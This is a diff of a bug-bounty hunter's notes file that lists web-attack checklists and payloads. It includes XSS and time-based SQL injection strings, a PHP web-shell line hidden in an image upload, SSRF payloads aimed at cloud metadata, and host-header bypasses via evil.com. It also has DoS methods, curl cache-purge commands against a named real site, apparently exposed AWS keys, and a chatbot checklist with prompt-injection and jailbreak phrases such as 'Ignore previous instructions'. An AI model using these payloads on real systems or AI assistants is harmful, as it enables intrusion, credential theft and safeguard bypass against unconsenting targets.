@@ -2,9 +2,9 @@ https://github.com/Az0x7/vulnerability-Checklist/blob/main/Cookie%20%20Attack/co
 https://github.com/HackShiv/OneDorkForAll/blob/main/dorks/60%20bug%20bounty%20dorks.txt
 https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR.md
 https://github.com/ianare/exif-samples/blob/master/jpg/Konica_Minolta_DiMAGE_Z3.jpg
-https://github.com/payloadbox/directory-payload-list
-https://github.com/orwagodfather/WordList/blob/main/xml.txt
 methodology https://readmedium.com/what-after-recon-part-01-bug-bounty-methodology-25ff3705a738
+https://github.com/gigachad80/grep-backURLs
+https://dorkengine.github.io/
 
 Broken Access Control
 Cryptographic Failures
@@ -16,6 +16,7 @@ Identification and Authentication Failures
 Software and Data Integrity Failures
 Security Logging and Monitoring Failures
 Server-Side Request Forgery (SSRF)
+
 
 https://securitytoolkits.com/tools/cve-search
 
@@ -39,6 +40,13 @@ recon part
 13. grayhatwarfare.com (finding buckets)
 14. https://phonebook.cz/#<find urls like wayback>
 
+
+## Burp Proxy Domains: Don’t just stick to the scope filter in Burp. Monitor all traffic — sometimes you’ll catch unknown domains not found through tools.
+
+Parameter Discovery: Use JSminer, ParamMiner, and GAP to discover hidden or interesting parameters.
+
+Postman Recon: Look for public Postman workspaces with exposed variables or credentials that can be misused.
+
 ------------------------------------------------------------------------------------------------------------
 BrokenLinkHijacking
 ---------------------->>
@@ -48,13 +56,157 @@ BrokenLinkHijacking
        ------> blc -rof --filter-level 3 https://example.com/
 Ouput will be like Something.
 
-
+.
 =>> this are the website is able to find BrokenLinkHijacking
 
 -> Input the domain name
 https://brokenlinkcheck.com/
 https://www.deadlinkchecker.com/
 https://ahrefs.com/
+
+===============================================================================================================================
+==============================
+INVITE FUNCTIONALITY CHECKLIST
+==============================
+
+[ ] 1. IDOR / Cross-Company Testing
+    - Change companyId in request
+    - Change organizationId
+    - Invite users to another company
+    - Accept invite for different company
+
+[ ] 2. Role Manipulation
+    - Modify role parameter (guest → admin)
+    - Escalate privileges via request tampering
+    - Assign super admin role
+    - Change role during invite acceptance
+
+[ ] 3. Invite Token Security
+    - Reuse invite token after acceptance
+    - Accept expired token
+    - Predictable / sequential token
+    - Modify token value
+    - Accept invite without token validation
+
+[ ] 4. Race Condition
+    - Send multiple parallel invite requests
+    - Duplicate invite creation
+    - Accept invite multiple times
+    - Duplicate role assignment
+
+[ ] 5. Rate Limiting / Abuse
+    - Unlimited resend invite
+    - Invite spam to same email
+    - Invite arbitrary external emails
+    - Cooldown bypass
+
+[ ] 6. Email Parameter Tampering
+    - Modify email field in request
+    - Invite hidden email (not shown in UI)
+    - Invite existing admin email
+    - Invite platform admin email
+
+[ ] 7. Authorization Checks
+    - Normal user sending invite
+    - Researcher sending company invite
+    - Guest inviting another user
+    - Deleted user still able to invite
+
+[ ] 8. Invite Acceptance Flow
+    - Accept invite while logged in as different user
+    - Accept invite without authentication
+    - Accept invite after account deletion
+    - Accept invite multiple times
+
+[ ] 9. XSS Testing
+    - Inject payload in invite message
+    - Inject payload in email subject
+    - Blind XSS in email template
+    - Stored XSS via role name
+
+[ ] 10. Session Issues
+    - Accept invite in different session
+    - Change email before accepting invite
+    - Accept invite after password reset
+
+
+
+
+
+
+
+
+
+
+====================================================================================================================================
+=====================================
+AI / CHATBOT SECURITY TESTING CHECKLIST
+=====================================
+
+[ ] 1. Prompt Injection
+    - Override system instructions
+    - Ask model to reveal hidden prompts
+    - Try: "Ignore previous instructions"
+    - Extract internal policies
+
+[ ] 2. Data Leakage
+    - Ask for internal documents
+    - Ask for previous user conversations
+    - Try enumerating sensitive data
+    - Ask for API keys or tokens
+
+[ ] 3. Cross-User Data Exposure
+    - Ask chatbot about other users
+    - Retrieve previous conversation history
+    - Check session isolation
+
+[ ] 4. SSRF via Chatbot
+    - Provide URL input
+    - Check if bot fetches external URLs
+    - Use Burp Collaborator
+    - Try internal IPs (127.0.0.1, 169.254.169.254)
+
+[ ] 5. File Upload Abuse
+    - Upload malicious files
+    - Test SVG with script
+    - Check file parsing vulnerabilities
+    - Try large file DoS
+
+[ ] 6. Code Execution / Tool Abuse
+    - If chatbot runs code, test sandbox escape
+    - Try command injection patterns
+    - Attempt path traversal
+
+[ ] 7. Model Output Manipulation
+    - Inject HTML/JS
+    - Stored XSS via chatbot response
+    - Markdown injection
+
+[ ] 8. Authentication Bypass
+    - Ask chatbot to perform restricted actions
+    - Try privilege escalation via prompt
+
+[ ] 9. Rate Limit / Resource Abuse
+    - Spam long prompts
+    - Token exhaustion
+    - Large context abuse
+
+[ ] 10. Jailbreak Testing
+    - Attempt policy bypass
+    - Try harmful content generation
+    - Attempt restricted topic bypass
+
+[ ] 11. Sensitive Action Execution
+    - Ask bot to reset password
+    - Ask bot to create admin user
+    - Test if bot has backend action permissions
+
+[ ] 12. API Exposure
+    - Inspect chatbot network calls
+    - Extract API keys from JS
+    - Test backend endpoints manually
+
+
 
 
 =================================================================================================================================
@@ -87,6 +239,17 @@ If the server is misconfigured and allows it, you will see output like:
 sub1.target.com has address 192.168.1.10
 mail.target.com has address 192.168.1.20
 www.target.com has address 192.168.1.30
+
+
+==============================================================================================================================
+Login page vulnerability
+------------------------->>
+
+1. user enumration
+2. while web app is ckecking this email is register here or not try give long string here ti perform Dos 
+
+
+
 
 
 =====================================================================================================
@@ -162,8 +325,39 @@ https://medium.com/@Az3m/business-logic-checklist-eafde7f86dc2
 
 
 
+----------------------------------------------------------------------------------------------------------
+How we can Perform a DOS attack to a target application?
+---------------------------------------------------------->>
+1. Long String Based DoS attacks
+· Try to input long password when registering an account in the input field
+· Try to input long text in Address, Name, Username, etc.
+· Try to input malicious DOS payload or commands like Sleep, Timeout etc in the input field
 
--->'"></sCript><video src=">" oneorror=setTimeout'confirm\x281\x29'>
+2. Picture Name Parameter
+· Upload a picture with large value in the name parameter.
+· Upload a picture with the DoS payload inside it.
+· Insert a DoS payload on image’s “size” parameter.
+· Insert various payload in the meta-data of the pic and upload.
+
+3. Pixel Flood Attack
+· Try to upload a picture with large resolution image
+
+4.Rate Limiting resulting in DOS attacks.
+A rate limiting algorithm is used to check if the user session (or IP-address) has to be limited based on the information in the session cache. Some of the real time examples where rate limiting vulnerabilities can be found
+
+i. Password reset — Capture the request in burp and use intruder and repeat the request for 1000 times and check limiting
+ii. Comments in blogs — Capture the request in burp and use intruder and repeat the request for 1000 times and check limiting
+iii. Email Bombing — capture the request in burp and use intruder and repeat the request for 1000 times and check limiting
+iv. Account creation activation request- capture the request in burp and use intruder and repeat the request for 1000 times and check limiting.
+v. And many more……..
+
+5. Application-Level DoS via XMLRPC in wordpress sites.
+1. Find some wordpress website with XMLRPC enabled and call the systems.listMethods
+
+https://akash-venky091.medium.com/application-level-dos-attacks-4a77bcdb1602
+
+
+
 
 --------------------------------------------------------------------------------------------------------
 Exploitation of Denegerious HTTP Method
@@ -198,6 +392,16 @@ There are some basic RC tests that you can try in the context of Logic Flaws.
 - Joining a group
 - when transfering money one a/c to other account.
 - Like, subscribe, follow, unfollow, Vote ..etc that required limit.
+  
+Add user
+Host program
+Resend MFA
+Submission state change
+Reward payout
+Comment posting
+Invite acceptance
+Delete user
+Change password
 
 
 
@@ -290,12 +494,103 @@ Unuath cache purging
 -------------------------->
 check if cache: HIT in response for for it 
 
-curl -S -D - https://app.withpersona.com/
-curl -X PURGE https://withpersona.com/
+curl -S -D - https://jobs.myntra.com/splash/splash.js
+curl -X PURGE https://jobs.myntra.com/splash/splash.js
 
 ## Web cache deception
 
+---------------------------------------------------------------------------------------------------------------------
+AWS Ingnito vulnerability
+-------------------------->>
 
+here is required INTENTITY_POOL_ID 
+
+Search form any where 
+
+- page.domain:"gov.uk" AND filename:"env.js"
+env.js
+main.js
+app.js
+config.js
+aws.js
+
+** Github search
+"site.com" IDENTITY_POOL_ID 
+
+
+
+
+sudo apt install -y curl jq awscli tcpdump
+
+⚠️ You do NOT need AWS credentials for most checks below.
+
+1️⃣ Verify AWS RUM endpoint is the ONLY reachable service
+Test RUM data plane endpoint
+curl -I https://dataplane.rum.eu-west-1.amazonaws.com
+
+✅ Expected:
+
+HTTP 403 or 404
+
+No auth = no data accepted
+
+❌ Red flag:
+
+200 OK
+
+Descriptive error about permissions
+
+2️⃣ Check Cognito Identity Pool behavior (unauth flow)
+Get identity ID (public, intended)
+curl -s https://cognito-identity.eu-west-1.amazonaws.com/ \
+  -H "Content-Type: application/x-amz-json-1.1" \
+  -H "X-Amz-Target: AWSCognitoIdentityService.GetId" \
+  -d '{
+    "IdentityPoolId": "eu-west-1:3330d35d-e9c6-4774-a736-661a2cceef14"
+  }' | jq
+
+✅ Expected:
+
+Returns IdentityId
+
+❌ Red flag:
+
+Errors revealing internal config
+
+Additional metadata leakage
+
+📌 This alone is NOT a bug (RUM requires this)
+
+3️⃣ Attempt to fetch unauth credentials (OBSERVATIONAL)
+curl -s https://cognito-identity.eu-west-1.amazonaws.com/ \
+  -H "Content-Type: application/x-amz-json-1.1" \
+  -H "X-Amz-Target: AWSCognitoIdentityService.GetCredentialsForIdentity" \
+  -d '{
+    "IdentityId": "eu-west-1:422db64b-42b4-c9d2-898f-73d6d7205608"
+  }' | jq
+Evaluate output carefully
+
+✅ Expected:
+
+Temporary creds
+
+Very short expiration
+
+No permissions outside RUM
+
+🚨 Reportable if:
+
+Long-lived creds
+
+Reusable creds
+
+Errors mentioning extra AWS services
+
+
+
+curl -s https://cognito-identity.eu-west-1.amazonaws.com/ -H "Content-Type: application/x-amz-json-1.1" -H "X-Amz-Target: AWSCognitoIdentityService.GetCredentialsForIdentity"-d '{"IdentityId": "eu-west-1:422db64b-4237-cc89-cb4c-22806a28af36"}' | jq
+
+Other information avialable on notes
 
 
 -------------------------------------------------------------------------------------------------------------------------
@@ -363,7 +658,16 @@ set X-Forwarded-Host to realweb.com
 set X-Forwarded-Host to bing.com 
 and Host to realweb.com 
 
+also try 
+@
+#
+.
+as well
+Because some time the company or devloper has whitelist the domain to stick there domain or sub-domain only thay you try this type of bypass from any where________
 
+host: google.com.evil.com
+host: google.com@evil.com
+host: google.com#evil.com
 
 
 ---------------------------------------------------------------------------------------------------------------------------------------
@@ -394,6 +698,7 @@ CSRF
 =>> for the bypass samesite csrf protection try to change there method POST to GET (bcz here it is passing cookie and verifi with this also ther are also several method search it)
 
  
+==>> Tool    https://tools.nakanosec.com/csrf/
 =>> https://medium.com/@xploiterd/how-to-perform-and-exploit-cross-site-request-forgery-csrf-attacks-1764c0f23585
 
 1. CSRF to change password which lead to account takeover
@@ -543,6 +848,8 @@ where you can find this vulnerability
 5. idor on refresh profile page  
 6. any other userid pass in request body or parameter
 
+7. HTTP Parameter pollution [if application any parameter attacker=23sd34d so it will attacker=dfv45&victim=34mnm34]
+
 #1 https://twitter.com/M0_SADAT/status/1361289751597359105
 Looking for high impact IDOR?
 Always try to find the hidden parameters for this endpoints using Arjun and Parameth
@@ -560,6 +867,7 @@ Don’t forget to try create/update/delete operations on objects that are public
 
 
 https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR-Old.md
+https://mrdesoky0.notion.site/Ultimate-IDOR-Testing-Checklist-2a11e69c871d80f884dcf543480010e5
 
 
 
@@ -618,62 +926,309 @@ Other Vulnerabilities
 
 
 ------------------------------------------------------------------------------------------------------------------------------------------
-SSRF
--------->
-1. SSRF via Uloading Image.(png to svg)
-2. SSRF Via uloading video
-3. By Openresirect Vulnerability
-4. By JavaScript
 
+========================================
+SSRF (Server-Side Request Forgery) Notes
+========================================
 
-1. go to the website to sending image or any other think before you send this intercept this request in burpsuit and look into this and find any type of url where it's faching data from any external source than here past you burpcollaborater link tha  send 
+----------------------------------------
+   I. SSRF Classification Framework
+----------------------------------------
+1. Reflected SSRF
+   - Server fetches external URL and returns response.
 
+2. Blind SSRF
+   - No visible response.
+   - Confirm via out-of-band interaction (DNS/HTTP).
 
-vulnerable url /contact-us/
-1  go to https://target.cpm/contact-us/
-2. enter burp collabrateor cilnt payload
-3. click on send 
-4. when go to burp collabrator client and you got http and dns intercation are there
+3. Semi-Blind SSRF
+   - Timing differences
+   - Error message variations
+   - Response code changes
 
-ssrf via xmlrpc 
+========================================
 
-try to put url of burp collabrator in every enter url field 
+Key Areas to Hunt for SSRF
+----------------------------------------
+1. Image upload (PNG → SVG conversion)
+2. Video upload processing
+3. Open Redirect chaining
+4. JavaScript-based URL fetch
+5. Profile update fields (website, avatar, bio link)
+6. Contact forms
+7. Register forms (name, address, website fields)
+8. HTML-to-PDF conversion
+9. XML-RPC endpoints
+10. Chatbot URL fetching features
 
-ssrf via open redirect
+----------------------------------------
+Common SSRF Injection Points
+----------------------------------------
+- Insert URL fields
+- Add website field
+- Add profile link
+- Upload image (external fetch)
+- Upload video (FFMPEG processing)
+- Webhook URL
+- Verify URL field
+- Redirect parameters
+- Proxy features
 
-Backend machine scan
-PORT scan
-File over port scan
-Whitelist SSRF Bypass
-6/25
-Machine scan over port
-AWS ec2 
-SSRF xss
-File Upload SSRF
-SSRF to Dos
-1. Detection : Burp Collaborator
-2. EXPlOIT : Not every HTTP is ssrf | Please check that IP info | CHAT BOTS / BOX not buggy for ssrf
-3. Escaltion
-GET :
-https://site.com/index.php?uri=http://burpcollaborator.net : HTTP
+----------------------------------------
+Basic Manual Testing Workflow
+----------------------------------------
+1. Intercept request in Burp Suite before submission.
+2. Look for parameters that accept URLs.
+3. Replace parameter value with Burp Collaborator URL.
+4. Submit request.
+5. Monitor Burp Collaborator for DNS/HTTP interaction.
+
+Example vulnerable flow:
+----------------------------------------
+1. Visit https://target.com/contact-us/
+2. Enter Burp Collaborator payload in URL field.
+3. Submit form.
+4. Check Burp Collaborator for DNS/HTTP interaction.
+
+----------------------------------------
+SSRF via XML-RPC
+----------------------------------------
+Test by injecting Collaborator URL into any URL parameter in XML-RPC requests.
+
+----------------------------------------
+SSRF via Open Redirect
+----------------------------------------
+Chain SSRF using open redirect endpoints to bypass filters.
+
+----------------------------------------
+Backend Machine Testing
+----------------------------------------
+- Internal port scanning
+- File over port scanning
+- Whitelist SSRF bypass
+- AWS EC2 metadata access
+- SSRF → XSS chaining
+- SSRF → DoS
+- SSRF via file upload
+
+----------------------------------------
+Detection & Exploitation Notes
+----------------------------------------
+1. Detection: Use Burp Collaborator.
+2. Not every HTTP request is SSRF — verify source IP.
+3. Chatbots or sandbox environments may cause false positives.
+4. Escalation testing should be controlled.
+
+----------------------------------------
+Example GET Payloads
+----------------------------------------
+https://site.com/index.php?uri=http://burpcollaborator.net
 https://site.com/index.php?uri=http://127.0.0.1:8080/
-Regsiter forms : names . address,
-Waybackurls : uri , url , red, redirect
-Add data , ADD links , Verify URL, Add website
 
-SSRF through internal file reade
-SSRF to RFI
-SSRF to RFI to XSS
-SSRF to read cloud meta-deta 
-SSRF through the video file upload FFMPEG
+----------------------------------------
+Wayback Parameter Hunting
+----------------------------------------
+Search for:
+uri
+url
+redirect
+redirect_uri
+proxy
+host
+height
+width
 
+----------------------------------------
+SSRF Escalation Techniques
+----------------------------------------
+- Internal file read
+- Remote File Inclusion (RFI)
+- SSRF → RFI → XSS
+- SSRF → Cloud metadata access
+- SSRF via FFMPEG video processing
+
+FFMPEG SSRF Example:
+----------------------------------------
 https://github.com/neex/ffmpeg-avi-m3u-xbin
 ./gen_xbin_avi.py file://<filename> file_read.avi
 
-SSRF in HTML to PDF conversion(save this file .html format "><svg/onload=document.write(document.location)>
-"><iframe src="file:///ect/passwd">
+----------------------------------------
+HTML to PDF SSRF Payloads
+----------------------------------------
+"><svg/onload=document.write(document.location)>
+"><iframe src="file:///etc/passwd">
+
+----------------------------------------
+Port Testing (Controlled)
+----------------------------------------
+Common Ports:
+80
+443
+8080
+8443
+25
+21
+22
+3306
+8000
+
+Behavior Indicators:
+- Instant response → likely open port
+- Delayed response → likely filtered/closed
+- DNS only → may not be SSRF
+- HTTP interaction → strong SSRF indicator
+
+----------------------------------------
+Time-Based Detection
+----------------------------------------
+Open port → instant response
+Closed port → delayed response
+
+----------------------------------------
+Cloud SSRF (AWS / GCP / DO)
+----------------------------------------
+Metadata Endpoint:
+169.254.169.254/latest/
+
+Test Payloads:
+http://169.254.169.254/latest/
+https://169.254.169.254/latest/
+169.254.169.254/proxy/latest
+
+----------------------------------------
+EC2 Metadata Keywords
+----------------------------------------
+ami-id
+ami-launch-index
+events
+hostname
+iam
+instance
+local-hostname
+local-ipv4
+mac
+windows
+
+----------------------------------------
+APIPA Payload Variations
+----------------------------------------
+169.254.169.254
+169.254.169.254/
+http://169.254.169.254/latest
+https://169.254.169.254/latest
+
+Bypass Variations:
+localhost/169.254.169.254
+127.0.0.1/http://169.254.169.254/latest
+127.0.1/https://169.254.169.254/latest
+127.1/169.254.169.254/latest
+
+----------------------------------------
+Whitelist Bypass SSRF
+----------------------------------------
+- Use special characters
+- Use @, #, .  symbol
+- Use encoded IP
+- Use alternative IP formats
+- Chain open redirect
+
+----------------------------------------
+Common SSRF Keywords
+----------------------------------------
+proxy
+url
+page
+data
+index
+width
+height
+img
+file
+cdn-cgi
+amazonaws
+host
+redirect
+callback
+webhook
 
 
+------------------------------------------
+XI. High-Value Targets for SSRF
+----------------------------------------
+
+- Webhook URLs
+- PDF generators
+- Image processors
+- Video processors (FFMPEG)
+- URL preview features
+- Import-from-URL features
+- Chatbots with URL summarization
+- OAuth redirect handlers
+- XML parsers
+- Open redirect endpoints
+
+
+
+
+\
+
+@
+.
+
+
+IMP : echo flaws.cloud | waybackurls |  tee data  - for URLs to grep
+
+169.254.169.254
+169.254.169.254/
+
+http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/
+
+
+url=https://169.254.169.254/latest
+uri
+host
+proxy
+height
+width
+localhost/169.254.169.254
+redirect_uri
+127.0.0.1/http://169.254.169.254/latest
+127.0.1/https://169.254.169.254/latest
+127.1/169.254.169.254/latest
+
+  "AccessKeyId" : "ASIARD6GXVWXRFRNHUOO",
+  "SecretAccessKey" : "zAjOKFFliRgAoQwwlVvjUh+5qCUoMwTUwR9Q8rbd",
+
+Whitelist Bypass SSRF:
+Example: [Include relevant examples with special characters]
+
+
+APIPA Payloads:
+http://169.254.169.254/latest
+https://169.254.169.254/latest
+169.254.169.254/proxy/latest
+
+
+
+
+
+6. SSRF Automation:
+
+echo dell.com | waybackurls | grep cdn-cgi | tee ssrftest
+
+dell.com/data/i/url/height-widith/api.dell.com/cdn-cgi/data.zip
+
+cat urls.txt | grep "=" | qsreplace "burpcollaborator_link" >> tmp-ssrf.txt; httpx -silent -l tmp-ssrf.txt -fr 
+
+echo dell.com | waybackurls | grep cdn-cgi | tee ssrftest
+
+
+
+subfinder -d target.com | httpx -mc 404,401,403 | tee subs.txt 
+cat subs.txt | waybackurls | tee data.txt
+cat data.txt | gf ssrf | tee ssrf.txt
+
+cat ssrftest | grep "=" | qsreplace "169.254.169.254/latest" | httpx -ct 
 
 ---------------------------------------------------------------------------------------------------------------------------------------------
 Price temparing
@@ -719,6 +1274,8 @@ Mostly I focus on Login pages and try to check if ORG is using jsp,php or aspx i
 
 findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls |  gf sqli >>> sqli; sqlmap -m sqli-batch --random-agent --level 1
 
+if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"*/
+
 ----------------------------------------------------------------------------------------------------------------------------------------
 unsafe file upload
 ------------------->
@@ -735,19 +1292,19 @@ unsafe file upload
 - File Traversal e.g. `../../../tmp/lol.png`
 - Command Injection e.g. `; sleep 10;`
 
-For xss
---------->>
-%PDF-1.7
-1 0 obj
-<< /Pages 1 0 R /OpenAction 2 0 R >>
-endobj
-2 0 obj
-<< /S /JavaScript /JS (app.alert("xss poc")) >>
-endobj
-trailer << /Root 1 0 R >>
+"<?php system('id');?>" >> file.png
 
+Content Type
+The content type can be manipulated to any type, including image/png, text/plain, and text/html.
 
+Double Extension
+Double extensions can be utilized to bypass restrictions, such as:
 
+file.txt.php
+file.png.php
+file.php.#.jpg
+file.png%00.php
+file.php%0a.png
 
 
 
@@ -843,6 +1400,12 @@ bufferoverflow
 
 
 find this on search feald to send long to long string on there if it is overflow any think spciel so thal bug
+open search field and search <AAAAAAAAAAAAAAAAAAAAAAAAAAAa> long string 500 or more charector and sent this ti introdure and send this request to multiple time and now here can 500 internal error and here can see the some data
+
+if there is any signup page put here log string like <aaaa long string>@gmail.com
+%n
+%25
+other methord use
 
 
 ----------------------------------------------------------------------------------------------------------
@@ -877,7 +1440,4 @@ Ticket trick
 -------------->
 
 if any comapany ha
-ving there help-desk section, if issuing ticket by sending mail than you should try to find on that try send on this issue mail if you are receiving on you own email so that's vulnerability
-
-
-
+having there help-desk section, if issuing ticket by sending mail than you should try to find on that try send on this issue mail if you are receiving on you own email so that's vulnerability
